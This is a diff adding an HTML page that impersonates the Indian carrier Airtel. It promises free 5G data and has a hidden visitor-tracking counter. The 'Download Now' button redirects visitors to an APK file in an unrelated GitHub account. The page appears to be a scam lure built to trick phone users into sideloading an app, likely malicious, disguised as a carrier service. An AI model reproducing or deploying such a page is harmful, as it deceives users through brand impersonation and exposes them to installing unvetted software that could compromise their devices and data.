@@ -1,0 +1,94 @@
+<script type="text/javascript">
+var sc_project=12716115; 
+var sc_invisible=1; 
+var sc_security="3f078a20"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="Web Analytics"
+href="https://statcounter.com/" target="_blank"><img
+class="statcounter"
+src="https://c.statcounter.com/12716115/0/3f078a20/1/"
+alt="Web Analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+<html>
+    
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<head>
+<meta property="og:title"  content="Airtel-5G">
+	<meta property="og:image"  content="https://i.postimg.cc/X77RGF20/airtel5g.jpg">
+	<meta property="og:image:width" content="15" />
+	<meta property="og:image:height" content="15" />
+	<meta property="og:description"  content="Airtel-5G with 10GB data daily for 3-MONTHS">
+    <Title>Download</Title>
+    <style>
+        body{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+.dabavanu {
+	background-color:#d63333;
+	cursor:pointer;
+	color:#ffffff;
+	font-family:Arial;
+	font-size:20px;
+	font-weight:bold;
+    padding: 15px;
+	text-decoration:none;
+	text-shadow:0px 1px 0px #d63333;
+}
+.dabavanu:hover {
+	background-color:#d63333;
+}
+.dabavanusw {
+	background-color:#d63333;
+	cursor:pointer;
+	color:#ffffff;
+	font-family:Arial;
+	font-size:20px;
+	font-weight:bold;
+    padding: 15px;
+	text-decoration:none;
+	text-shadow:0px 1px 0px #315cbb;
+}
+.dabavanu:active {
+	position:relative;
+	top:1px;
+}
+
+    </style>
+</head>
+<script>
+function dbvao() 
+{
+    var m = new Date().getMinutes(); 
+	if(m%2==0)
+	{
+		window.location="https://github.com/airtenew/downloadnow/raw/main/Airtel-5G.apk"; 
+	}
+	else
+	{
+		window.location="https://github.com/airtenew/downloadnow/raw/main/Airtel-5G.apk";
+	}
+}
+</script>
+<body>
+<center>
+    
+        <img src="https://i.postimg.cc/X77RGF20/airtel5g.jpg"  height="100"/>
+        <h2>Airtel-5G</h2><h3>
+        Experience the high-speed 5G network<br>
+of India with 30X download speed<br>
+Free 10GB daily for 3-MONTHS<br><br>
+Download app and Activate service now.</h3>
+        <div onclick="dbvao()"  class="dabavanu">Download Now</a>
+
+
+        
+
+
+    </div>
+</center>
+</html>
